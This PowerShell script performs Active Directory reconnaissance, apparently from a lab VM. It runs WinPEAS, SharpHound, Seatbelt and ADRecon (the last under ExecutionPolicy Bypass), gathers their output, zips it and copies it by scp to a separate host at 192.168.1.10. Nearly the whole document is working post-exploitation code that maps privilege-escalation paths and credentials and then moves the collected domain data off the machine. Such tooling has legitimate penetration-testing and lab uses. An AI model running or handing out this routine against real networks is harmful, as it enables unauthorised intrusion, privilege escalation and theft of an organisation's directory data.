<#
.SYNOPSIS
    Gather relevant enumeration data from the domain and securely copy it to host.
#>

# 1. Set up some variables for file paths and host info

# Where to store the output locally on the VM
$localOutputDir = "C:\Temp\EnumerationResults"
if (!(Test-Path $localOutputDir)) {
    New-Item -ItemType Directory -Path $localOutputDir | Out-Null
}

# SSH / SCP transfer details
$hostUser   = "user"
$hostIP     = "192.168.1.10"
$hostFolder = "/home/user/VM-Data"    # Folder on the host machine where files will be stored

# 2. Run WinPEAS (in domain mode) and capture output
Write-Host "[*] Running WinPEAS domain enumeration..."
# Adjust the WinPEAS command syntax if needed
.\winPEAS.exe cmd domain | Out-File -Encoding ASCII "$($localOutputDir)\winPEAS_domain_output.txt"
Write-Host "[+] WinPEAS domain enumeration saved to winPEAS_domain_output.txt"

# 3. Run other recommended domain enumeration tools

Write-Host "[*] Running SharpHound..."
# Example using default collection methods (adjust domain/collection methods as needed)
.\SharpHound.exe --CollectionMethod All --OutputDirectory $localOutputDir
Write-Host "[+] SharpHound data collection complete."

Write-Host "[*] Running Seatbelt..."
.\Seatbelt.exe all > "$($localOutputDir)\seatbelt_output.txt"
Write-Host "[+] Seatbelt output saved."

Write-Host "[*] Running ADRecon..."
# Typically ADRecon is a PowerShell module; you might need to import it first
# For example: Import-Module .\ADRecon.ps1
# Then run:
# ADRecon -All -OutputPath $localOutputDir
# The line below is just an example if you have ADRecon already loaded or set up:
powershell -ExecutionPolicy Bypass -Command "Import-Module .\ADRecon.ps1; ADRecon -All -OutputPath $localOutputDir -Verbose"
Write-Host "[+] ADRecon output saved in $localOutputDir"

# 4. (Optional) Compress results to make transfer simpler/faster
Write-Host "[*] Compressing all result files..."
$zipPath = "$($localOutputDir)\domain_enumeration_results.zip"
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($localOutputDir, $zipPath)
Write-Host "[+] Results compressed to domain_enumeration_results.zip"

# 5. Use SCP to copy the files from the VM to your host
Write-Host "[*] Transferring files to $hostIP..."
# If you have SSH key-based auth, you might not need -Password. If you're using password auth,
# you may want to call scp in an interactive way or store credentials securely.
# The simplest approach (manual password prompt):
scp -r "$localOutputDir\domain_enumeration_results.zip" "$($hostUser)@$($hostIP):$($hostFolder)"

Write-Host "[+] Transfer complete. Enumeration data saved on host in $hostFolder."